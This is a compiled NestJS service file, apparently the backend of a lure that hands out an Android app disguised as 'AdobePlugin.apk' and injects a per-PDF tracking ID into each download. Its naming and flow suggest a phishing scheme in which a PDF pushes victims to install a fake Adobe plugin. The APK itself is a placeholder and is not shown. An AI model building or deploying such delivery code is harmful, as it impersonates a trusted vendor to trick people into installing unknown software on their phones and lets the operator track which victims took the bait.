"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.ApkService = void 0;
const common_1 = require("@nestjs/common");
const path_1 = require("path");
const fs = __importStar(require("fs"));
const apk_injector_service_1 = require("../apk-injector.service");
let ApkService = class ApkService {
    apkInjector;
    constructor(apkInjector) {
        this.apkInjector = apkInjector;
    }
    sendApk(pdfId, res) {
        const apkDir = (0, path_1.join)(__dirname, '..', '..', 'apk');
        const apkPath = (0, path_1.join)(apkDir, 'app.apk');
        if (!fs.existsSync(apkDir))
            fs.mkdirSync(apkDir, { recursive: true });
        if (!fs.existsSync(apkPath)) {
            fs.writeFileSync(apkPath, 'placeholder - replace with real signed APK');
        }
        res.setHeader('Content-Type', 'application/vnd.android.package-archive');
        res.setHeader('Content-Disposition', 'attachment; filename="AdobePlugin.apk"');
        if (pdfId) {
            try {
                const apkBuffer = fs.readFileSync(apkPath);
                const modifiedBuffer = this.apkInjector.inject(apkBuffer, `pdf_id=${pdfId}`);
                return res.end(modifiedBuffer);
            }
            catch (error) {
                console.error('APK Injection failed:', error.message);
                return res.sendFile(apkPath);
            }
        }
        else {
            return res.sendFile(apkPath);
        }
    }
};
exports.ApkService = ApkService;
exports.ApkService = ApkService = __decorate([
    (0, common_1.Injectable)(),
    __metadata("design:paramtypes", [apk_injector_service_1.ApkInjectorService])
], ApkService);
//# sourceMappingURL=apk.service.js.map